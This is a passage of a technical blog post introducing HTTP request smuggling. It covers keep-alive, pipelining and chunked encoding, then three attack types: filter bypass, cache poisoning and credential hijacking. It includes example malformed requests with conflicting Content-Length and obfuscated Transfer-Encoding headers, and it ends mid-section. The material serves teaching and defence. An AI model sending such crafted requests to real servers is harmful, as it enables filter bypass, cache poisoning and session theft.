Seems that a refresh was needed.&lt;/p&gt;

&lt;p&gt;Most of the links provided in this article should be easier to understand
&lt;em&gt;after&lt;/em&gt; reading this first part. This is gonna be a long serie, starting from
simple HTTP requests to very strange ones, with details about recently fixed
flaws on  several tools (and some CVE also). On this first article there is
nothing &lt;strong&gt;new&lt;/strong&gt;, just another way of explaining the problems. I hope this will
at least help refreshing memories on the problems.&lt;/p&gt;

&lt;p&gt;If you use HTTP servers, and especially if you use several HTTP agents (Reverse
Proxies, SSL Terminators, Load balancers, etc.), you should be interested by this.
If you build an HTTP agent you should master it, best thing would be knowing all
this better than me, if you spot any error, do not hesitate to comment or
&lt;a href=&quot;mailto:regis.leroy@makina-corpus.com&quot;&gt;contact me&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;HTTP Smuggling: What?&lt;/h2&gt;

&lt;h3&gt;Hiding HTTP queries in HTTP, Injection&lt;/h3&gt;

&lt;p&gt;That's it, the main idea is to hide HTTP in HTTP.&lt;/p&gt;

&lt;p&gt;To hide a message in a protocol you need to find a flaw, an issue, in the way an
agent is interpreting (reading) the message.&lt;/p&gt;

&lt;p&gt;HTTP Request smuggling is simply an injection of HTTP protocol into the HTTP
protocol. As always with security the main problem is &lt;strong&gt;injection&lt;/strong&gt;. If you can
inject SQL into SQL, HTML, javascript or css into an HTML response... you have
problems.&lt;/p&gt;

&lt;p&gt;When injecting javascript in a an HTML page you need to find a flaw in the
application outputing some user content. Here the players will &lt;strong&gt;tracks flaws in
the parsing of HTTP messages&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Some security problems closely related to HTTP smuggling are &lt;strong&gt;HPP&lt;/strong&gt; (HTTP
parameters pollution) that you can read on the
&lt;a href=&quot;https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf&quot; title=&quot;HTTP Parameter Pollution&quot;&gt;Stefano di Paola &amp;amp; Luca Carettoni paper in OWASP 09&lt;/a&gt; and
&lt;a href=&quot;https://www.owasp.org/index.php/HTTP_Response_Splitting&quot; title=&quot;HTTP Response Splitting&quot;&gt;&lt;strong&gt;HTTP Response splitting&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HPP&lt;/strong&gt; is a very specific
part of HTTP Smuggling, considering only the parameters used on the location and
 the problems arising from differences in the interpretations of strange
parameters (like repetitions of same url parameter).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Response splitting&lt;/strong&gt; is an attack used on an application (on the final backend)
where the backend will send more HTTP responses than expected. It's a tool that
could be used in HTTP Smuggling, but flaws are uncommon (they were problems with
newlines injections in PHP redirections or in Digest authentication username,
but this was a long time ago).&lt;/p&gt;

&lt;p&gt;Here I will mostly talk about &lt;em&gt;regular&lt;/em&gt; HTTP Smuggling, flaws coming from HTTP
syntax mistakes and protocol approximations.&lt;/p&gt;

&lt;h3&gt;Why?&lt;/h3&gt;

&lt;p&gt;We'll study in details the 3 main kinds of attacks below. But if you can hide
HTTP in HTTP you can perform various forms of attack, going from bypassing
security checks to hijacking user sessions or defacing content in caches.&lt;/p&gt;

&lt;p&gt;This is the story of several HTTP queries. Let's say we have at least 3
different queries, we'll name theses queries for clarity:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Suzann&lt;/strong&gt;: the &lt;strong&gt;S&lt;/strong&gt;muggler query,&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ivan&lt;/strong&gt;: the &lt;strong&gt;I&lt;/strong&gt;nnocent query,&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Walter&lt;/strong&gt;: the &lt;strong&gt;W&lt;/strong&gt;ookie, accomplice of the smuggler, usually a Forbidden
query. And, yes, it's a wookie. Because usually smugglers are working with
wookies.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;They will transit from one starting point, the attacker computer, to an HTTP
server (your HTTP server). And sometimes they will encounter a middleware server,
which is also reading and emitting HTTP. This could be a Load Balancer, an SSL
terminator, a reverse proxy cache, as static cache, etc.&lt;/p&gt;

&lt;p&gt;Suzann the smuggler is &lt;strong&gt;evil&lt;/strong&gt;, the goal of this query is to attack Ivan the
innocent.&lt;/p&gt;

&lt;p&gt;Suzann will not be a regular HTTP query like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /suzann.html HTTP/1.1\r\n
Host: www.example.com\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Encoding: gzip, deflate\r\n
Cache-Control: max-age=0\r\n
Connection: keep-alive\r\n
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Instead it could be something like that (not all in the same time :-) ):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET http://www.example.com/suzann.html?foo=%00\tHTTP/11111111111.2\r\n
     HOST: www.evil1.com\r\n
HOST: www.evil2.com\r\n
Content-length: 0\r\n
ContenT-length :\t100\r\n
Connection: keep-alive\n
 Content-length:\t10\r
 Transfer-eNCODIng\t\t:chunked\t\r\n
\r\n
(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And your server should reject most of the strange things present in this request
 example (this one is soo bad that I do not think any server would accept it).
If a flaw is found in the server it &lt;em&gt;could&lt;/em&gt; be used for smuggling and the
attacker could start to think about exploitations of the flaw.&lt;/p&gt;

&lt;p&gt;We'll start by a big rollback and give some details about HTTP to understand
all this.&lt;/p&gt;

&lt;h2&gt;HTTP&lt;/h2&gt;

&lt;p&gt;Back in the old time they were only a very old version of HTTP available (that
we call HTTP/0.9). Smuggling was not available. The only way to send 3
queries was opening 3 time a tcp/ip connection to the server and each time
asking for the targeted document:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--&amp;gt; open tcp/ip conn1
GET /Suzann.html\r\n
\r\n
&amp;lt;-- receive Suzann.html document
&amp;lt;html&amp;gt;\r\n
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;\r\n
&amp;lt;body&amp;gt;Suzann&amp;lt;/body&amp;gt;\r\n
&amp;lt;/html&amp;gt;\r\n
&amp;lt;-- conn1 is closed

--&amp;gt; open tcp/ip conn1
GET http://your.server.com/ivan.html\r\n
\r\n
&amp;lt;-- receive ivan.html document
&amp;lt;html&amp;gt;\r\n
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;\r\n
&amp;lt;body&amp;gt;Ivan&amp;lt;/body&amp;gt;\r\n
&amp;lt;/html&amp;gt;\r\n
&amp;lt;-- conn1 is closed

--&amp;gt; open tcp/ip conn1
GET /walter.html\r\n
\r\n
&amp;lt;-- receive walter.html document
&amp;lt;html&amp;gt;\r\n
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;\r\n
&amp;lt;body&amp;gt;Walter&amp;lt;/body&amp;gt;\r\n
&amp;lt;/html&amp;gt;\r\n
&amp;lt;-- conn1 is closed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;HTTP is a quite simple protocol, especially at this time. Note that I'm using
&lt;code&gt;\r\n&lt;/code&gt; to represent the CR and LF characters end-of-line markers.
This will get important later.&lt;/p&gt;

&lt;p&gt;Then comes HTTP/1.0, with one important thing added, the &lt;strong&gt;headers&lt;/strong&gt;. You &lt;em&gt;can&lt;/em&gt;
add them in the request, and the response will always contains headers.&lt;/p&gt;

&lt;p&gt;The first query became:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--&amp;gt; open tcp/ip conn1
GET /suzann.html HTTP/1.0\r\n
Host: your.server.com\r\n
User-agent: information gateways navigator 0.8\r\n
Accept: text/html\r\n
Foo Bar\r\n
\r\n
&amp;lt;-- receive Suzann.html document
HTTP/1.0 400 Bad Request\r\n
Server: Apache\r\n
Date: Fri, 24 Jul 1612 16:24:10 GMT\r\n
Content-Type: text/html\r\n
Content-Length: 138\r\n
Connection: close\r\n
\r\n
&amp;lt;html&amp;gt;\r\n
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;\r\n
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;\r\n
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;400 Bad Request&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;\r\n
&amp;lt;/body&amp;gt;\r\n
&amp;lt;/html&amp;gt;\r\n
&amp;lt;-- conn1 is closed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this response the important thing to note is &lt;strong&gt;Content-Length: 138&lt;/strong&gt;. If you
count all characters, starting at &lt;code&gt;&amp;lt;html&lt;/code&gt;, including the end-of-line characters,
you have exactly 138 characters, with one byte for each ascii7 character, 138
bytes. It seems size matters, and we'll see that &lt;strong&gt;size is everything&lt;/strong&gt; in our
problem. Here we also have an error code (400), the server said we made a
mistake in our query, this is not a problem, it's a nice thing to have in a
protocol (error messages). The error was a missing ':' between Foo and Bar.&lt;/p&gt;

&lt;p&gt;Let's go quickly to HTTP/1.1, the real HTTP protocol, still used almost
everywhere. The new HTTP/2 protocol is just starting to replace it on some
very limited places.&lt;/p&gt;

&lt;p&gt;We have several new features on HTTP/1.1 that will allow very bad behaviors for
&lt;em&gt;Suzann the smuggler&lt;/em&gt;, with some other features, less important for
smugglers (like the Host Header which is now required, it was optional before).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Keep Alive&lt;/strong&gt; mode&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Pipelined&lt;/strong&gt; queries&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Chunked&lt;/strong&gt; queries and responses&lt;/li&gt;
&lt;/ul&gt;


&lt;h3&gt;Keep Alive&lt;/h3&gt;

&lt;p&gt;With keep Alive we can open a connection to the server, request Suzann, receive
Suzann, then request Ivan and receive it, and at lastly request Walter and
receive it, in the same TCP/IP connection.&lt;/p&gt;

&lt;p&gt;As an HTTP client you can ask for keepAlive mode, but it's usually enabled by
default by the server even if you do not ask for it. You do it by adding this
header on the request:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Connection: keepalive
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the server side, the keep alive connection can be cut at any time (and most
servers should try to avoid long opened keep alive connections, especially if
they keep one dedicated process for each connection and cannot afford more than
a few hundred processes like the Apache httpd prefork mpm).&lt;/p&gt;

&lt;p&gt;On the response headers you will find:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Connection: close # means we're closing, easy
Connection: keep-alive # means we'll try to maintain this open a few seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usually, after a &lt;code&gt;close&lt;/code&gt; the server will close the tcp/ip connection.&lt;/p&gt;

&lt;p&gt;The goal of this was to retrieve faster all assets coming with an HTML page, by
reusing the tcp/ip connection opened for the document, avoiding the slow tcp/ip
connection opening.&lt;/p&gt;

&lt;p&gt;This keep-alive mode in the protocol is what things like Comet are trying to
exploit to maintain pseudo-infinite-time push/pull connections over HTTP. But
even without this advanced mode, keep-alive is used a lot in HTTP
environments, especially between the end-user and the first part of the
middleware. Usage of keep-alive between HTTP servers and proxies (in the
middleware or between the middleware and the backend) is less common.&lt;/p&gt;

&lt;h3&gt;Pipelines \o/&lt;/h3&gt;

&lt;p&gt;The other big thing in HTTP/1.1 is pipelining. Pipelining is sending several
queries &lt;strong&gt;before&lt;/strong&gt; having the responses of theses requests.&lt;/p&gt;

&lt;p&gt;Here's a schema of basic pipelining:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Client]                  [End Server]
        |                         |
        &amp;gt;-requ. Suzann ----------&amp;gt;|
        &amp;gt;-requ. Ivan ------------&amp;gt;|
        &amp;gt;-requ. Walter-----------&amp;gt;|
        |&amp;lt;---------- resp. Suzann-&amp;lt;
        |&amp;lt;------------ resp. Ivan-&amp;lt;
        |&amp;lt;---------- resp. Walter-&amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With only Keep Alive the schema was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Client]                  [End Server]
        |                         |
        &amp;gt;-requ. Suzann ----------&amp;gt;|
        |&amp;lt;---------- resp. Suzann-&amp;lt;
        &amp;gt;-requ. Ivan ------------&amp;gt;|
        |&amp;lt;------------ resp. Ivan-&amp;lt;
        &amp;gt;-req. Walter------------&amp;gt;|
        |&amp;lt;---------- resp. Walter-&amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With an HTTP proxy in the middle the schema is, usually:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Client]             [Middleware]          [End Server]
        |                     |                     |
        &amp;gt;-requ. Suzann ------&amp;gt;|                     |
        &amp;gt;-requ. Ivan --------&amp;gt;|                     |
        &amp;gt;-req. Walter -------&amp;gt;|                     |
        |                     &amp;gt;-requ. Suzann ------&amp;gt;|
        |                     |&amp;lt;------ resp. Suzann-&amp;lt;
        |&amp;lt;------ resp. Suzann-&amp;lt;                     |
        |                     &amp;gt;-requ. Ivan --------&amp;gt;|
        |                     |&amp;lt;-------- resp. Ivan-&amp;lt;
        |&amp;lt;-------- resp. Ivan-&amp;lt;                     |
        |                     &amp;gt;-req. Walter--------&amp;gt;|
        |                     |&amp;lt;------- resp Walter-&amp;lt;
        |&amp;lt;------ resp. Walter-&amp;lt;                     |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see that the connection between the middle agent (a reverse proxy cache
or an SSL terminator) and the end server is usually not using pipelining
(because that's an awfully complex thing to do well with HTTP).&lt;/p&gt;

&lt;p&gt;Sometimes the connection between the middleware and the end server is even not
using Keep Alive connections. Some other times it's reusing a pool of tcp keep
alive connections. But the first protection against HTTP smuggling applied here
is breaking your pipeline of requests in several requests, waiting for the
end of a first request before handling the next one.&lt;/p&gt;

&lt;p&gt;Eventually, the server is &lt;strong&gt;never&lt;/strong&gt; expected to respond to all requests in a
pipeline. You can get the first response with a &lt;code&gt;Connection: close&lt;/code&gt; header,
cutting the Keep Alive connection right after the response.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Client]             [Middleware]          [End Server]
        |                     |                     |
        &amp;gt;-requ. Suzann ------&amp;gt;|                     |
        &amp;gt;-requ. Ivan --------&amp;gt;|                     |
        &amp;gt;-req. Walter -------&amp;gt;|                     |
        |                     &amp;gt;-requ. Suzann ------&amp;gt;|
        |                     |&amp;lt;------ resp. Suzann-&amp;lt;
        |&amp;lt;------ resp. Suzann-&amp;lt;                     |
[ client is expected to re-send Ivan &amp;amp; Walter queries]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And this is the second big protection against smuggling. As soon as the
middleware detects a bad Suzann query, it should send a &lt;strong&gt;400 bad request&lt;/strong&gt;
 response &lt;strong&gt;and&lt;/strong&gt; close the connection (but if you really search you'll find
examples of proxies which does not close the keep alive after an error).&lt;/p&gt;

&lt;h3&gt;Chunks&lt;/h3&gt;

&lt;p&gt;Chunked transfer is an alternate way of transmitting long HTTP messages. Instead
of a transmission starting with a &lt;code&gt;Content-length&lt;/code&gt; header announcing the full
message size you can transmit the message by small (or not) chunks, each one
annoucing a size (in hexadecimal format).&lt;/p&gt;

&lt;p&gt;A special &lt;strong&gt;last-chunk&lt;/strong&gt; empty chunk marks the end of the message.&lt;/p&gt;

&lt;p&gt;We'll certainly study in detail chunks in next articles. The important thing
with chunks is that's it is another way of manipulating the size of the message.&lt;/p&gt;

&lt;p&gt;Chunks can be used on HTTP responses (usually) but also on queries.&lt;/p&gt;

&lt;p&gt;For an example you can read the &lt;a href=&quot;https://en.wikipedia.org/wiki/Chunked_transfer_encoding&quot; title=&quot;Chunked transfer encoding&quot;&gt;Wikipedia page&lt;/a&gt; explaining how
chunks can be used to transfer this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Wikipedia in\r\n\r\nchunks.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;as:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;4\r\n
Wiki\r\n
5\r\n
pedia\r\n
e\r\n
 in\r\n\r\nchunks.\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So much fun :-)&lt;/p&gt;

&lt;h2&gt;The key: Size matters&lt;/h2&gt;

&lt;p&gt;I said it several times. But, yes, size matters. To inject HTTP in HTTP the
key is usually to trick the HTTP agent reader about the size of your message.&lt;/p&gt;

&lt;p&gt;HTTP queries and responses are mostly a list of strings separated by end of lines.
And we saw with pipelines that you could send several queries, one after another.&lt;/p&gt;

&lt;p&gt;The HTTP agent reading the queries or parsing the responses MUST know where this
list of strings ends. this way, the agent can check if what's coming after is
another query (or response if it's a backend stream).&lt;/p&gt;

&lt;p&gt;The tools used by the HTTP reader is either the &lt;strong&gt;chunks mecanism&lt;/strong&gt; or the
&lt;strong&gt;Content-Length&lt;/strong&gt; header.&lt;/p&gt;

&lt;p&gt;And if something goes wrong &lt;strong&gt;here&lt;/strong&gt; you can start hiding some queries or
responses. One of the composants will parse the stream and will not understand the
incoming characters as new requests but as the previous request body, or will not
understand the stream as the first request response but as a new one.&lt;/p&gt;

&lt;p&gt;That's the key of HTTP Smuggling.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /suzann.html HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 0\r\n
Content-Length: 46\r\n
\r\n
GET /walter.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here if you accept the first Content-length header you have 2 requests. If you
take the second one as the right one instead, then you have one GET query, with
a body containing some bytes that you do not care about -- even if it looks like
 a query-- (a GET query with a body is something strange, POST query have bodies
and usually GET queries have only parameters, but it is allowed).&lt;/p&gt;

&lt;p&gt;Ok, so it's one OR two queries, no problem, but if you are a proxy seing one
query and transmitting this unique query to a backend which then sends you 2
responses you'd better know what to do with this second response. Or maybe it
would have been better to detect a bad HTTP request and avoid this problem.&lt;/p&gt;

&lt;h2&gt;HTTP Smuggling: the basics&lt;/h2&gt;

&lt;p&gt;HTTP smuggling may be used in 3 sort attacks (mainly).&lt;/p&gt;

&lt;h3&gt;Attack 1 : Bypass security filters&lt;/h3&gt;

&lt;p&gt;The first type of attack is &lt;strong&gt;bypassing security filters on Walter forbidden
query&lt;/strong&gt;. In this type of attack the Walter query is forbidden (Wookies is a
forbidden species), but Suzann is
hiding Walter from the middleware filters (storm troopers filtering the docks).&lt;br/&gt;
Eventually Walter is executed on the target, behind the filters (was hidden in
the cargo).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Attacker]              [Middleware]             [End Server]
        |                       |                        |
        &amp;gt;-req. Suzann(+Walter)-&amp;gt;|                        |
        |                       &amp;gt;-requ. Suzann(+Walter)-&amp;gt;|
        |                       |             \-Suzann--&amp;gt;|
        |                       |&amp;lt;--------- resp. Suzann-&amp;lt;
        |&amp;lt;-------- resp. Suzann-&amp;lt;                        |
        |                       |             \-Walter--&amp;gt;| [*]
        |                       |&amp;lt;---X----- resp. Walter-&amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem occurs at &lt;code&gt;[*]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note here the &lt;code&gt;&amp;lt;--X---&lt;/code&gt; arrow, the middleware may not be really aware that a
Walter query was emitted, and can reject the response (and close it). But the
query has already been emitted, and this enough &lt;em&gt;could&lt;/em&gt; be a problem.&lt;/p&gt;

&lt;p&gt;You have an example of such issue in &lt;a href=&quot;http://regilero.github.io/security/english/2015/03/25/nginx-integer_truncation&quot; title=&quot;Nginx Integer Truncation&quot;&gt;my previous blog post&lt;/a&gt;
with Nginx as end server, Varnish as middleware, and very huge queries. In this
variant the Middleware receive a response while it still thinks the 1st query is
not even completly transmitted (just to say that between theory and real
exploits things can get quite complex).&lt;/p&gt;

&lt;p&gt;To avoid loosing the response from Walter the attacker can sometimes try to
pipeline some other queries. But the attacker goal is maybe just to run the
Walter query without being filtered (like accessing known security exploit on a
CMS where an HTTP filter prevents regular access to the backoffice).&lt;/p&gt;

&lt;h3&gt;Attack 2 : Replacement of regular response&lt;/h3&gt;

&lt;p&gt;The second type is &lt;strong&gt;defacement of Ivan&lt;/strong&gt;. On a successful attack by Suzann,
anyone requesting Ivan would get a Walter response. This can be used to prevent
regular use of Ivan (Deny of Service), but could also be worst, Walter the
wookie could contain some very dangerous content (like javascript code). Just
imagine Ivan is a regular javascript library on a CDN used by several thousands
of people daily, if the CDN sends the Walter javascript in place of this one...&lt;/p&gt;

&lt;p&gt;Queries have to be &lt;strong&gt;pipelined&lt;/strong&gt; by the attacker for this sort of attack.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Attacker]              [Middleware]             [End Server]
        |                        |                        |
        &amp;gt;-req. Suzann(+Walter) -&amp;gt;|                        |
        |-req. Ivan ---#2-------&amp;gt;|                        |
        |                        &amp;gt;--req. Suzann(+Walter)-&amp;gt;| [*1*]
        |                        |         \_req. Suzann-&amp;gt;|
        |                        |&amp;lt;-------- resp. Suzann -&amp;lt;
        |&amp;lt;----#1--- resp. Suzann &amp;lt;                        |
        |                        |         \_req. Walter-&amp;gt;| t1
        |                        &amp;gt;--req. Ivan -----------&amp;gt;| t2
        |                  [*2*] |&amp;lt;-------- resp. Walter -&amp;lt; t3
        |&amp;lt;----#2--- resp. Walter |                        |
        |                        |&amp;lt;---X-------- resp Ivan |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Suzann(+Walter)&lt;/code&gt; means that for the Middleware this is a simple &lt;code&gt;Suzann&lt;/code&gt;
request but for the backend this is two pipelined queries.&lt;br/&gt;
The middleware see a pipeline of 2 queries (Suzann/Ivan) but the backend
receive a pipeline of two queries (Suzann/Walter) and a third query (Ivan).&lt;/p&gt;

&lt;p&gt;In the timeline you also have 3 times, t1, t2 and t3.&lt;br/&gt;
The attack will fail if t2 occurs after t3 (for this the first Suzann may
sometimes be choosen to be slow enough to avoid sending the Walter response too
early).&lt;/p&gt;

&lt;p&gt;The regular Ivan response may be rejected by the middleware (which already have
2 responses), that's just a side effect.&lt;/p&gt;

&lt;p&gt;Here the biggest issue is at &lt;code&gt;[*2*]&lt;/code&gt;, the middleware receive a Walter response
which is assigned to ivan request (request #2).&lt;/p&gt;

&lt;p&gt;Suzann has performed some kind of Jedi trick on the empire dock's guards and
they feed the next ship requesting something from the docks with one or more
wookies instead of the regular cargo.&lt;/p&gt;

&lt;h3&gt;Wait, how do other requests/people get impacted in the second type of attack?&lt;/h3&gt;

&lt;p&gt;That's a very important question. In the first type of attack the goal was to
bypass a security, so the role of the attacker was obvious.&lt;/p&gt;

&lt;p&gt;On the second defacement type of attack the attacker seems the only guy impacted
by the defacement. But you need to get a large view of the picture.&lt;/p&gt;

&lt;p&gt;First usage is to get a response on the Walter query (if Walter was a forbidden
query like in type 1 attack).&lt;/p&gt;

&lt;p&gt;Second usage, if the middleware is a &lt;strong&gt;cache server&lt;/strong&gt; the goal of the attack is
&lt;strong&gt;cache poisoning&lt;/strong&gt;, where the faked response is stored on the wrong cache entry.
A successful attack will deface the responses for everybody, not only for the
attacker. This is the &lt;em&gt;obvious&lt;/em&gt; attack, very dramatic (Ivan was replaced by
Walter in the cache and this will be for the cache lifetime duration).&lt;/p&gt;

&lt;p&gt;But even without a caching problem an attacker can make a proxy server becomes
&lt;strong&gt;crazy&lt;/strong&gt;. On some successful attacks the proxy will mix queries from several
clients. The attacker queries will be mixed with some other innocent queries
from innocent clients, even without a cache, remember this point. Most
middlewares have to trust the backend responses timeline and when backend
responses goes wild strange things happen. This mix of communications between
different users is also in the last attack type (type 3, credential hijacking).
But we'll see in a coming article how user mix can happen without going to type
3.&lt;/p&gt;

&lt;h3&gt;Attack 3 : Credentials Hijacking&lt;/h3&gt;

&lt;p&gt;This third type of attack was referenced in the 2005 Watchfire study. Most proxy
are now engineered well enough to prevent this from hapenning. &lt;strike&gt;It is now very
hard to have a proxy sending a query to a backend, reusing the same connection
as the one used on a previous unclosed communication  (or I did not try
hard enough, maybe).&lt;/strike&gt;. I did miss some tests here, having backend connection
pooling is not rare at all. But usually it is done by HTTP agents which are robust
enough to avoid being transmitters of splitting attacks (@see next part for transmitters
and splitters).&lt;/p&gt;

&lt;p&gt;The trick was to inject a partial query in the stream, and wait for the regular
user query, coming in the same backend connection and added to the partial
request. It means the proxy is able to add some data in &lt;code&gt;[+]&lt;/code&gt; to a tcp/ip
connection with the backend that was unfinished in &lt;code&gt;[-]&lt;/code&gt;. But the proxy does not
know two queries were send, for the proxy there was only one query and the
response is already received.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;           [Attacker]               [Middleware]          [End Server]
                |                         |                     |
                &amp;gt;-req. Suzann[+Walter] --&amp;gt;|                     |
                |                         &amp;gt;-requ. Suzann ------&amp;gt;|
                |                         |&amp;lt;----- resp. Suzann  |
                |&amp;lt;---------- resp. Suzann |                     |
                |                         | [*]                 |
 [Innocent]     |                         | \-requ. Walter ----&amp;gt;|
     |          |                         | (unterminated)      | [-]
     &amp;gt;--------------------- req. Ivan ---&amp;gt;|                     |
     |                                    &amp;gt;-req. Ivan ---------&amp;gt;| [+]
     |                                    |&amp;lt;----- resp. Walter -&amp;lt;
     |&amp;lt;-------------------- resp. Walter -&amp;lt;                     |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was a complexe scheme, but for example the Ivan request could contain a
valid session that Walter did not have (&lt;strong&gt;cookies&lt;/strong&gt;, &lt;strong&gt;HTTP Authentication&lt;/strong&gt;).
Also this valid session was needed for Walter query to succeed.
Credentials used in Ivan query are stolen (&lt;strong&gt;hijacked&lt;/strong&gt;) for a &lt;code&gt;Walter&lt;/code&gt; query.&lt;/p&gt;

&lt;p&gt;Damages of such issues are very high (you can make user perform unwanted POST
actions, using his own credentials and rights). Keep alive and pipelines are not used
in most proxies while communicating with backends.&lt;br/&gt;
Implementing shared backends connections or pools is a dangerous thing, unless you are
very carefull of not being a splitting attack transmitter.&lt;/p&gt;

&lt;h3&gt;Transmitters and Splitters&lt;/h3&gt;

&lt;p&gt;In smuggling attacks you will need mainly two types of actors behaving
differently on some HTTP protocol issues.&lt;/p&gt;

&lt;p&gt;On the first part you need &lt;strong&gt;transmitters&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;A transmitter is an HTTP agent, a proxy, which receive an altered HTTP query and
transmits the alteration to an HTTP backend. When testing HTTP proxies you will
encounter a lot of proxies which are cleaning up strange queries (like you were
using tabulations as space separators, but the proxy is replacing tabulations
with spaces when talking to the backend). Here the transmitters, by definition,
is not cleaning up the &lt;em&gt;strange part&lt;/em&gt; of the request. The transmitters, also,
see the altered HTTP request as an unique query.&lt;/p&gt;

&lt;p&gt;The second actor of the attack is a &lt;strong&gt;splitter&lt;/strong&gt;, an involuntary accomplice.
This agent receive the evil request from the &lt;strong&gt;transmitter&lt;/strong&gt;.
For the splitter this transmitted request is not unique, it's a multiple request
(a pipeline) and this actor will emit several HTTP responses. This agent is
&lt;strong&gt;splitting&lt;/strong&gt; the request.&lt;br/&gt;
Sending 2 responses for one query is enough, but it may also be one hundred.&lt;br/&gt;
The splitter made a parsing error and detects a pipeline of queries (or the
transmitters made this error, not detecting it was really a pipeline).&lt;/p&gt;

&lt;p&gt;We'll use a typology for the next schemas:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;----qA-----&amp;gt; : HTTP query for request A
&amp;lt;-----rAqA--&amp;lt; : HTTP response A matched with request A
&amp;lt;-X---rAqA--&amp;lt; : HTTP response A rejected (connection close for example)
&amp;lt;----*rAqB*-&amp;lt; : HTTP response A matched with request B (very Bad thing)
&amp;gt;--qA+(qB)--&amp;gt; : HTTP query for request A, Hiding a query B
       [*CP*] : Cache poisoning
       [*RS*] : Response Splitting
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The basic schema is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [Origin]            [transmitter]         [Splitter]
        |                    |                    |
        &amp;gt;-----qA+(qB)-------&amp;gt;|                    |
        |                    &amp;gt;-----qA+(qB)-------&amp;gt;| [*RS*]
        |                    |&amp;lt;-----------rAqA----&amp;lt;
        |&amp;lt;-----------rAqA----&amp;lt;                    |
        |                    |&amp;lt;-----------rBqB----&amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we have a security issue in &lt;code&gt;[*RS*]&lt;/code&gt; where a request splitting occurs.&lt;/p&gt;

&lt;p&gt;If the Splitting attack can be issued by an application issue &lt;strong&gt;you do not need
a transmitter&lt;/strong&gt; communicating an altered HTTP query.&lt;/p&gt;

&lt;p&gt;In terms of &lt;strong&gt;responsability&lt;/strong&gt; the HTTP splitter is having a real security issue.
Or at least that's what we could assume, when talking with project maintainers
it could be quite hard to have HTTP splitting issues considered as security
issues (let's hope this attitude will change in the future).&lt;br/&gt;
The transmitter &lt;strong&gt;could&lt;/strong&gt; detect the smuggling tentative and &lt;strong&gt;should&lt;/strong&gt; clean up
the query before transmitting, but that's usually not considered a security
issue, unless every other actor implementing the HTTP RFC would see 2 queries
when the transmitter is only seing one (something like an &lt;em&gt;inverted splitter&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;Using this sort of schema attack of type 1 (filters bypass) is already achieved
with the simple case.&lt;/p&gt;

&lt;p&gt;Attack of type 2 (defacement) needs a pipeline of queries. It also need a third
actor, a  &lt;strong&gt;target&lt;/strong&gt;. The target is something like a cache which will be the
final victim.&lt;br/&gt;
The target is usually also the transmitter.&lt;/p&gt;

&lt;p&gt;Here is a type2 issue:&lt;/p&gt;

